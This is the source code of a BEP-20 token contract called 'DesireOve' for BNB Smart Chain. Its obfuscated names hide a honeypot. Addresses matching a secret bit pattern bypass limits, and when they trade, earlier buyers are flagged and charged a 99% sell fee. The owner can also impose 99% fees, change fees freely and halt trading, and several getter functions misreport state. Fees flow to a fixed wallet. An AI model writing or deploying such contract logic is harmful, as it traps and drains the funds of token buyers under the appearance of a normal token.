/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DesireOve is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Desire Ove ";
    string constant _symbol = "DesireOve";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingModeTxMinFeeBots;
    mapping(address => bool) private buyIsModeLiquidity;
    mapping(address => bool) private liquiditySwapBurnMode;
    mapping(address => bool) private maxSellBotsModeLaunched;
    mapping(address => uint256) private buyLimitSwapBotsMinSell;
    mapping(uint256 => address) private walletSwapIsLimitTeamBots;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private walletMinModeAuto = 0;
    uint256 private burnSellIsBuy = 8;

    //SELL FEES
    uint256 private receiverModeIsLiquidityMaxLimitSwap = 0;
    uint256 private liquidityMaxBurnAuto = 8;

    uint256 private exemptMarketingTradingMin = burnSellIsBuy + walletMinModeAuto;
    uint256 private sellReceiverAutoTxExemptBurnLiquidity = 100;

    address private launchedExemptIsMin = (msg.sender); // auto-liq address
    address private sellWalletBurnReceiver = (0x8c77db02651fF1752289EA5bffFFe36638606783); // marketing address
    address private modeBotsFeeLaunchedAuto = DEAD;
    address private tradingMaxLaunchedSellMin = DEAD;
    address private exemptModeBotsBurn = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minExemptIsReceiver;
    uint256 private limitBotsSellModeLaunched;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private teamExemptWalletSellReceiver;
    uint256 private modeAutoLaunchedWalletMarketingMin;
    uint256 private buyIsSwapTeam;
    uint256 private buySellMinReceiverBots;
    uint256 private teamBurnTxBots;

    bool private txIsBuyAuto = true;
    bool private maxSellBotsModeLaunchedMode = true;
    bool private txIsAutoExempt = true;
    bool private swapTradingModeReceiver = true;
    bool private receiverLimitBuyMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private buyAutoModeBurn = _totalSupply / 1000; // 0.1%

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        teamExemptWalletSellReceiver = true;

        tradingModeTxMinFeeBots[msg.sender] = true;
        tradingModeTxMinFeeBots[address(this)] = true;

        buyIsModeLiquidity[msg.sender] = true;
        buyIsModeLiquidity[0x0000000000000000000000000000000000000000] = true;
        buyIsModeLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        buyIsModeLiquidity[address(this)] = true;

        liquiditySwapBurnMode[msg.sender] = true;
        liquiditySwapBurnMode[0x0000000000000000000000000000000000000000] = true;
        liquiditySwapBurnMode[0x000000000000000000000000000000000000dEaD] = true;
        liquiditySwapBurnMode[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return autoBurnMarketingBots(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return autoBurnMarketingBots(sender, recipient, amount);
    }

    function autoBurnMarketingBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = launchedTeamExemptWallet(sender) || launchedTeamExemptWallet(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                maxBuyExemptFeeLaunchedIs();
            }
            if (!bLimitTxWalletValue) {
                txTradingMaxBuyExemptBurn(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return botsAutoMarketingWallet(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(txIsBuyAuto, "Trading is not active");
        }

        if (!Administration[sender] && !tradingModeTxMinFeeBots[sender] && !tradingModeTxMinFeeBots[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || liquiditySwapBurnMode[sender] || liquiditySwapBurnMode[recipient], "Max TX Limit has been triggered");

        if (liquidityModeIsBotsTradingReceiver()) {teamLimitIsBotsSwap();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = txLimitModeBuy(sender) ? burnTeamReceiverMarketing(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function botsAutoMarketingWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txLimitModeBuy(address sender) internal view returns (bool) {
        return !buyIsModeLiquidity[sender];
    }

    function minBotsTeamBuy(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            exemptMarketingTradingMin = liquidityMaxBurnAuto + receiverModeIsLiquidityMaxLimitSwap;
            return autoWalletMinExemptSell(sender, exemptMarketingTradingMin);
        }
        if (!selling && sender == uniswapV2Pair) {
            exemptMarketingTradingMin = burnSellIsBuy + walletMinModeAuto;
            return exemptMarketingTradingMin;
        }
        return autoWalletMinExemptSell(sender, exemptMarketingTradingMin);
    }

    function burnTeamReceiverMarketing(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(minBotsTeamBuy(sender, receiver == uniswapV2Pair)).div(sellReceiverAutoTxExemptBurnLiquidity);

        if (maxSellBotsModeLaunched[sender] || maxSellBotsModeLaunched[receiver]) {
            feeAmount = amount.mul(99).div(sellReceiverAutoTxExemptBurnLiquidity);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function launchedTeamExemptWallet(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function autoWalletMinExemptSell(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = buyLimitSwapBotsMinSell[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function txTradingMaxBuyExemptBurn(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        walletSwapIsLimitTeamBots[exemptLimitValue] = addr;
    }

    function maxBuyExemptFeeLaunchedIs() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (buyLimitSwapBotsMinSell[walletSwapIsLimitTeamBots[i]] == 0) {
                    buyLimitSwapBotsMinSell[walletSwapIsLimitTeamBots[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(sellWalletBurnReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function liquidityModeIsBotsTradingReceiver() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverLimitBuyMax &&
    _balances[address(this)] >= buyAutoModeBurn;
    }

    function teamLimitIsBotsSwap() internal swapping {
        uint256 amountToLiquify = buyAutoModeBurn.mul(walletMinModeAuto).div(exemptMarketingTradingMin).div(2);
        uint256 amountToSwap = buyAutoModeBurn.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = exemptMarketingTradingMin.sub(walletMinModeAuto.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(walletMinModeAuto).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnSellIsBuy).div(totalETHFee);

        payable(sellWalletBurnReceiver).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                launchedExemptIsMin,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBurnSellIsBuy() public view returns (uint256) {
        if (burnSellIsBuy == receiverModeIsLiquidityMaxLimitSwap) {
            return receiverModeIsLiquidityMaxLimitSwap;
        }
        if (burnSellIsBuy != buyAutoModeBurn) {
            return buyAutoModeBurn;
        }
        return burnSellIsBuy;
    }
    function setBurnSellIsBuy(uint256 a0) public onlyOwner {
        burnSellIsBuy=a0;
    }

    function getTradingMaxLaunchedSellMin() public view returns (address) {
        if (tradingMaxLaunchedSellMin == launchedExemptIsMin) {
            return launchedExemptIsMin;
        }
        return tradingMaxLaunchedSellMin;
    }
    function setTradingMaxLaunchedSellMin(address a0) public onlyOwner {
        if (tradingMaxLaunchedSellMin != sellWalletBurnReceiver) {
            sellWalletBurnReceiver=a0;
        }
        tradingMaxLaunchedSellMin=a0;
    }

    function getMaxSellBotsModeLaunchedMode() public view returns (bool) {
        return maxSellBotsModeLaunchedMode;
    }
    function setMaxSellBotsModeLaunchedMode(bool a0) public onlyOwner {
        if (maxSellBotsModeLaunchedMode != receiverLimitBuyMax) {
            receiverLimitBuyMax=a0;
        }
        if (maxSellBotsModeLaunchedMode != txIsBuyAuto) {
            txIsBuyAuto=a0;
        }
        maxSellBotsModeLaunchedMode=a0;
    }

    function getMaxSellBotsModeLaunched(address a0) public view returns (bool) {
        if (a0 == exemptModeBotsBurn) {
            return receiverLimitBuyMax;
        }
        if (a0 == launchedExemptIsMin) {
            return txIsAutoExempt;
        }
            return maxSellBotsModeLaunched[a0];
    }
    function setMaxSellBotsModeLaunched(address a0,bool a1) public onlyOwner {
        maxSellBotsModeLaunched[a0]=a1;
    }

    function getModeBotsFeeLaunchedAuto() public view returns (address) {
        if (modeBotsFeeLaunchedAuto != exemptModeBotsBurn) {
            return exemptModeBotsBurn;
        }
        return modeBotsFeeLaunchedAuto;
    }
    function setModeBotsFeeLaunchedAuto(address a0) public onlyOwner {
        modeBotsFeeLaunchedAuto=a0;
    }

    function getWalletMinModeAuto() public view returns (uint256) {
        if (walletMinModeAuto != receiverModeIsLiquidityMaxLimitSwap) {
            return receiverModeIsLiquidityMaxLimitSwap;
        }
        return walletMinModeAuto;
    }
    function setWalletMinModeAuto(uint256 a0) public onlyOwner {
        if (walletMinModeAuto != liquidityMaxBurnAuto) {
            liquidityMaxBurnAuto=a0;
        }
        if (walletMinModeAuto == burnSellIsBuy) {
            burnSellIsBuy=a0;
        }
        walletMinModeAuto=a0;
    }

    function getExemptModeBotsBurn() public view returns (address) {
        return exemptModeBotsBurn;
    }
    function setExemptModeBotsBurn(address a0) public onlyOwner {
        exemptModeBotsBurn=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}